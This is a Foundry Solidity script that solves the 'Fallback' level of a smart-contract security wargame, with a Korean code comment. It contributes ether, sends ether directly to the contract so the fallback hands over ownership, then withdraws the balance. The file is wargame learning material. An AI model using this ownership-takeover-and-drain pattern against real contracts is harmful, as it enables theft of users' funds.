// // SPDX-License-Identifier: MIT
// forge script script/Level02FallbackSolution.s.sol -vvvv --broadcast
pragma solidity ^0.8.26;

import "../src/Level01Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level02FallbackSolution is Script {

    // payable 함수가 포함된 컨트렉이라 payble(주소)를 인자로 넣어줘야한다.
    Fallback public fallbackinstance = Fallback(payable(0x5fd21cC25Bf3DA9B1CEf40d152E622eCBEa4Ef26));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackinstance.contribute{value: 0.0001 ether}();
        
        uint mycontributions = fallbackinstance.getContribution();
        console.log("My Contributions(Wei) :", mycontributions);

        (bool success, ) = address(fallbackinstance).call{value: 0.0001 ether}("");
        require(success, "Call to fallbackInstance failed");

        console.log("Owner: ", fallbackinstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        fallbackinstance.withdraw();

        vm.stopBroadcast();
    }

}